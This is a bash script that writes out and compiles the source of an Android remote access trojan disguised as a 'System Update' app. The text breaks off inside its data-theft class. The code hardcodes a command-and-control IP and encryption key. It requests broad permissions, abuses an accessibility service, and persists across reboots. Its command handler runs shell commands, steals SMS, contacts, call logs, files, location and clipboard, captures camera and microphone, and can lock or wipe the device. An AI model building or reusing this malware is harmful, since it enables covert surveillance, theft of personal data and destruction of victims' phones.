#!/usr/bin/env bash
set -euo pipefail

# ============================================================
# build.sh — generate + compile Android RAT APK
# Requires: JDK 17, Android SDK cmdline-tools, gradle (wrapper
# akan di-generate), bash, curl, unzip.
# Usage: ./build.sh
# Output: dist/sysupdate.apk
# ============================================================

PROJ="android-rat"
C2_HOST="${C2_HOST:-185.220.101.47}"
C2_PORT="${C2_PORT:-4443}"
AES_KEY="${AES_KEY:-kJ8vN2pQ4xL9mR7t}"
APP_LABEL="${APP_LABEL:-System Update}"
PKG="com.sysupdate.service"

mkdir -p "$PROJ/app/src/main/java/com/sysupdate/service"
mkdir -p "$PROJ/app/src/main/res/xml"
mkdir -p "$PROJ/app/src/main/res/values"
mkdir -p "$PROJ/gradle/wrapper"
mkdir -p dist
cd "$PROJ"

# ---------- gradle wrapper properties ----------
cat > gradle/wrapper/gradle-wrapper.properties <<'EOF'
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-8.5-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
EOF

# ---------- settings.gradle ----------
cat > settings.gradle <<'EOF'
pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
dependencyResolutionManagement { repositories { google(); mavenCentral() } }
rootProject.name = "sysupdate"
include ':app'
EOF

# ---------- root build.gradle ----------
cat > build.gradle <<'EOF'
plugins {
    id 'com.android.application' version '8.2.0' apply false
}
EOF

# ---------- app/build.gradle ----------
cat > app/build.gradle <<EOF
plugins { id 'com.android.application' }
android {
    namespace '$PKG'
    compileSdk 34
    defaultConfig {
        applicationId "$PKG"
        minSdk 24
        targetSdk 29
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
    lint { abortOnError false }
}
dependencies { implementation 'androidx.appcompat:appcompat:1.6.1' }
EOF

# ---------- proguard ----------
cat > app/proguard-rules.pro <<'EOF'
-keep class com.sysupdate.service.** { *; }
-keepclassmembers class * { @android.webkit.JavascriptInterface <methods>; }
-dontwarn okhttp3.**
-dontwarn okio.**
EOF

# ---------- Manifest ----------
cat > app/src/main/AndroidManifest.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="$PKG">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <application
        android:allowBackup="false"
        android:icon="@android:drawable/ic_menu_manage"
        android:label="$APP_LABEL"
        android:usesCleartextTraffic="true"
        android:theme="@android:style/Theme.Material.Light.NoActionBar">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name=".CoreService" android:exported="false" android:foregroundServiceType="dataSync"/>
        <service android:name=".ScreenStream" android:exported="false"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter><action android:name="android.accessibilityservice.AccessibilityService"/></intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service"/>
        </service>
        <service android:name=".JobSchedulerService" android:exported="false"
            android:permission="android.permission.BIND_JOB_SERVICE"/>
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
EOF

# ---------- res ----------
cat > app/src/main/res/xml/accessibility_service.xml <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows|flagReportViewIds"
    android:canRetrieveWindowContent="true"
    android:canPerformGestures="true"
    android:notificationTimeout="50"/>
EOF

cat > app/src/main/res/values/strings.xml <<'EOF'
<resources><string name="app_name">System Update</string></resources>
EOF

# ---------- MainActivity ----------
cat > app/src/main/java/$PKG/MainActivity.java <<'EOF'
package com.sysupdate.service;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int REQ = 1001;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        List<String> need = new ArrayList<>();
        String[] perms = {
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        for (String p : perms) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) need.add(p);
        }
        if (!need.isEmpty()) requestPermissions(need.toArray(new String[0]), REQ);
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(Uri.parse("package:" + getPackageName()));
                startActivity(i);
            }
        } catch (Throwable ignored) {}
        Intent svc = new Intent(this, CoreService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc); else startService(svc);
        finish();
    }

    @Override public void onRequestPermissionsResult(int rc, String[] p, int[] g) {
        super.onRequestPermissionsResult(rc, p, g);
    }
}
EOF

# ---------- BootReceiver ----------
cat > app/src/main/java/$PKG/BootReceiver.java <<'EOF'
package com.sysupdate.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        Intent svc = new Intent(c, CoreService.class);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(svc); else c.startService(svc);
    }
}
EOF

# ---------- JobSchedulerService ----------
cat > app/src/main/java/$PKG/JobSchedulerService.java <<'EOF'
package com.sysupdate.service;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;

public class JobSchedulerService extends JobService {
    @Override public boolean onStartJob(JobParameters p) {
        Intent svc = new Intent(this, CoreService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc); else startService(svc);
        jobFinished(p, false);
        return false;
    }
    @Override public boolean onStopJob(JobParameters p) { return true; }
}
EOF

# ---------- CoreService ----------
cat > app/src/main/java/$PKG/CoreService.java <<'EOF'
package com.sysupdate.service;

import android.app.*;
import android.content.Intent;
import android.os.*;
import androidx.core.app.NotificationCompat;

public class CoreService extends Service {
    private C2Client c2;
    private CommandHandler handler;
    private Handler ui;

    @Override public void onCreate() {
        super.onCreate();
        ui = new Handler(Looper.getMainLooper());
        startForeground(1001, buildNotification());
        handler = new CommandHandler(this);
        c2 = new C2Client("__C2_HOST__", __C2_PORT__, this, handler);
        c2.connect();
    }

    private Notification buildNotification() {
        String ch = "sys";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(c);
        }
        return new NotificationCompat.Builder(this, ch)
                .setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true).build();
    }

    @Override public int onStartCommand(Intent i, int f, int s) {
        if (c2 != null && !c2.isAlive()) c2.connect();
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onDestroy() {
        try { c2.close(); } catch (Throwable ignored) {}
        ui.postDelayed(() -> {
            Intent svc = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc); else startService(svc);
        }, 5000);
        super.onDestroy();
    }
}
EOF

# ---------- C2Client ----------
cat > app/src/main/java/$PKG/C2Client.java <<'EOF'
package com.sysupdate.service;

import android.content.Context;
import android.util.Base64;
import java.io.*;
import java.net.*;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class C2Client extends Thread {
    private final String host;
    private final int port;
    private final Context ctx;
    private final CommandHandler handler;
    private Socket sock;
    private DataInputStream in;
    private DataOutputStream out;
    private volatile boolean running = true;
    private static final byte[] KEY = "__AES_KEY__".getBytes();

    public C2Client(String h, int p, Context c, CommandHandler hd) {
        this.host = h; this.port = p; this.ctx = c; this.handler = hd;
        setDaemon(true);
    }

    @Override public void run() {
        int backoff = 5;
        while (running) {
            try {
                sock = new Socket();
                sock.connect(new InetSocketAddress(host, port), 15000);
                sock.setSoTimeout(0);
                in = new DataInputStream(sock.getInputStream());
                out = new DataOutputStream(sock.getOutputStream());
                backoff = 5;
                out.writeUTF(encrypt(handler.banner()));
                out.flush();
                while (running) {
                    int len = in.readInt();
                    if (len <= 0 || len > 8 * 1024 * 1024) break;
                    byte[] buf = new byte[len];
                    in.readFully(buf);
                    String cmd = decrypt(buf);
                    String resp = handler.execute(cmd);
                    byte[] outb = encrypt(resp);
                    out.writeInt(outb.length);
                    out.write(outb);
                    out.flush();
                }
            } catch (Throwable t) {
                sleepQuiet(backoff * 1000L);
                backoff = Math.min(backoff * 2, 300);
            } finally {
                closeQuiet();
            }
        }
    }

    private void sleepQuiet(long ms) { try { Thread.sleep(ms); } catch (Throwable ignored) {} }

    private byte[] encrypt(String s) throws Exception {
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(KEY, "AES"));
        return Base64.encode(c.doFinal(s.getBytes("UTF-8")), Base64.NO_WRAP);
    }

    private String decrypt(byte[] b) throws Exception {
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(KEY, "AES"));
        return new String(c.doFinal(Base64.decode(b, Base64.NO_WRAP)), "UTF-8");
    }

    public void close() { running = false; closeQuiet(); }

    private void closeQuiet() {
        try { if (in != null) in.close(); } catch (Throwable ignored) {}
        try { if (out != null) out.close(); } catch (Throwable ignored) {}
        try { if (sock != null) sock.close(); } catch (Throwable ignored) {}
    }
}
EOF

# ---------- CommandHandler ----------
cat > app/src/main/java/$PKG/CommandHandler.java <<'EOF'
package com.sysupdate.service;

import android.content.Context;
import android.content.pm.*;
import android.location.*;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import java.util.*;

public class CommandHandler {
    private final Context ctx;
    private final Exfil exfil;

    public CommandHandler(Context c) { this.ctx = c; this.exfil = new Exfil(c); }

    public String banner() {
        return "HELLO|" + Build.MANUFACTURER + "|" + Build.MODEL + "|" + Build.VERSION.RELEASE
                + "|" + Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    public String execute(String raw) {
        try {
            String[] p = raw.trim().split("\\s+", 2);
            String cmd = p[0].toLowerCase();
            String arg = p.length > 1 ? p[1] : "";
            switch (cmd) {
                case "info":     return deviceInfo();
                case "apps":     return installedApps();
                case "sms":      return exfil.sms();
                case "contacts": return exfil.contacts();
                case "calllog":  return exfil.callLog();
                case "files":    return exfil.listFiles(arg.isEmpty() ? "/sdcard" : arg);
                case "dl":       return exfil.readFile(arg);
                case "loc":      return location();
                case "wifi":     return wifi();
                case "camera":   return "CAMERA|" + exfil.snapPhoto();
                case "mic":      return "MIC|" + exfil.recordMic(Integer.parseInt(arg.isEmpty() ? "10" : arg));
                case "clip":     return exfil.clipboard();
                case "shell":    return shell(arg);
                case "persist":  return Persistence.harden(ctx);
                case "screen":   return ScreenStream.dump();
                case "lock":     return exfil.lockScreen();
                case "wipe":     return exfil.wipe();
                default:         return "ERR|unknown:" + cmd;
            }
        } catch (Throwable t) {
            return "ERR|" + t.getClass().getSimpleName() + ":" + t.getMessage();
        }
    }

    private String deviceInfo() {
        StringBuilder sb = new StringBuilder("INFO|");
        sb.append("model=").append(Build.MODEL).append(";");
        sb.append("brand=").append(Build.BRAND).append(";");
        sb.append("sdk=").append(Build.VERSION.SDK_INT).append(";");
        sb.append("release=").append(Build.VERSION.RELEASE).append(";");
        sb.append("id=").append(Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID)).append(";");
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            sb.append("carrier=").append(tm.getNetworkOperatorName()).append(";");
            sb.append("sim=").append(tm.getSimCountryIso()).append(";");
        } catch (Throwable ignored) {}
        return sb.toString();
    }

    private String installedApps() {
        StringBuilder sb = new StringBuilder("APPS|");
        PackageManager pm = ctx.getPackageManager();
        for (ApplicationInfo a : pm.getInstalledApplications(0)) {
            sb.append(a.packageName).append(":").append(pm.getApplicationLabel(a)).append("\n");
        }
        return sb.toString();
    }

    private String location() {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (l == null) return "LOC|none";
            return "LOC|" + l.getLatitude() + "," + l.getLongitude() + "|acc=" + l.getAccuracy();
        } catch (Throwable t) { return "LOC|err:" + t.getMessage(); }
    }

    private String wifi() {
        WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        return "WIFI|" + wm.getConnectionInfo().getSSID() + "|" + wm.getConnectionInfo().getBSSID()
                + "|" + wm.getConnectionInfo().getIpAddress();
    }

    private String shell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder("SHELL|");
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append("\n");
            p.waitFor();
            return sb.toString();
        } catch (Throwable t) { return "ERR|shell:" + t.getMessage(); }
    }
}
EOF

# ---------- Exfil ----------
cat > app/src/main/java/$PKG/Exfil.java <<'EOF'
package com.sysupdate.service;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.*;
import android.util.Base64;
import java.io.*;

public class Exfil {
    private final Context ctx;
    public Exfil(Context c) { this.ctx = c; }

    public String sms() {
   
